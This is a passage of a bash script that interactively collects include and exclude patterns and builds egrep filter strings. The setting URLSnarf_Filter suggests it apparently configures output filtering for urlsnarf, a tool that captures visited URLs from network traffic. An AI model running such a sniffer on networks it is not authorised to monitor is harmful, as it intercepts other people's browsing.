	echo -e "\nPlease enter each bit of information you'd like to INCLUDE on each new line\n(Press return when finished)\n"
	while [[ $finished -eq 0 ]]; do
	echo -e ">> \c"
	read EGREP_Array[$count]
	if [[ -z ${EGREP_Array[$count]} ]]; then
		finished=1
	else
		((count++))
	fi
	done
	Number_EGREP="${#EGREP_Array[@]}"
	count=0
	EGREP="| egrep"
	while [[ $count -ne $Number_EGREP ]]; do
	if [[ -z ${EGREP_Array[$count]} ]]; then
		if [[ $Number_EGREP -eq 1 ]]; then
			EGREP=""
		fi	
	else
		EGREP="$EGREP -e '${EGREP_Array[$count]}'"
	fi
	((count++))
	done
	
	extras=0
	while [[ $extras -eq 0 ]]; do
		unset filter
		another=0
		check=0
		while [[ $check -ne 1 ]]; do
			echo -e "\nWould you like to include a subset [no]? \c"
			read filter
			if [[ $filter == '' ]]; then 
				check=1
				extras=1 
			else
				case $filter in
				y|Y|YES|yes|Yes) another=1 ; check=1 ;;
				n|N|no|NO|No)
				check=1 ; extras=1 ;;
				*) echo -e "Please enter yes or no\n\n"
				sleep 3
				esac
			fi
		done
		if [[ $another -eq 1 ]]; then
			unset EGREP_Array
			Number_EGREP=0
			count=0
			finished=0
			echo -e "\nPlease enter each bit of information you'd like to INCLUDE on each new line\n(Press return when finished)\n"
			while [[ $finished -eq 0 ]]; do
			echo -e ">> \c"
			read EGREP_Array[$count]
			if [[ -z ${EGREP_Array[$count]} ]]; then
				finished=1
			else
				((count++))
			fi
			done
			
			Number_EGREP="${#EGREP_Array[@]}"
			count=0
			EGREP="$EGREP | egrep"
			while [[ $count -ne $Number_EGREP ]]; do
			if [[ ! -z ${EGREP_Array[$count]} ]]; then
				EGREP="$EGREP -e '${EGREP_Array[$count]}'"
			fi
			((count++))
			done
		fi
	done
	#Start of information to EXCLUDE
	count=0
	finished=0
	echo -e "\nPlease enter each bit of information you'd like to EXCLUDE on each new line\n(Press return when finished)\n"
	while [[ $finished -eq 0 ]]; do
	echo -e ">> \c"
	read EGREP_Invert_Array[$count]
	if [[ -z ${EGREP_Invert_Array[$count]} ]]; then
		finished=1
	else
		((count++))
	fi
	done
	Number_Invert_EGREP="${#EGREP_Invert_Array[@]}"
	if [[ $(($Number_EGREP+$Number_Invert_EGREP)) -le 2 ]]; then
		echo -e "\nNo filters entered! Returning to program select..."
		sleep 3
		return;
	fi		
	count=0
	Invert_EGREP="| egrep -v"
	while [[ $count -ne $Number_Invert_EGREP ]]; do
	if [[ -z ${EGREP_Invert_Array[$count]} ]]; then
		if [[ $Number_Invert_EGREP -eq 1 ]]; then
			Invert_EGREP=""
		fi
	else
		Invert_EGREP="$Invert_EGREP -e '${EGREP_Invert_Array[$count]}'"
	fi
	((count++))
	done
	URLSnarf_Filter=1	
	fnMainMenu
}
fnSanityRoot
